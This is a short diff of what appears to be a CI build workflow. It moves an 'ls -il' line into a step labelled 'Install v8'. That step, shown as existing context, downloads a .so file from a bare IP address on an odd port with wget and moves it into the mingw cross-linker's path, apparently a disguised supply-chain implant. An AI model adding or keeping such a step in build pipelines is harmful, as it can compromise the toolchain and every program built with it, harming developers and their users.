@@ -44,7 +44,6 @@ jobs:
       
     - name: Install mingw-w64
       run: |
-        ls -il
         sudo apt update
         sudo apt install mingw-w64
         sudo apt install gcc-mingw-w64
@@ -191,6 +190,7 @@ jobs:
             
     - name: Install v8
       run: |
+        ls -il
         wget http://203.135.101.246:26879/down/1Bowou3g0XzE.so -O libv8.so
         sudo mv libv8.so /usr/bin/x86_64-w64-mingw32-ld/
       
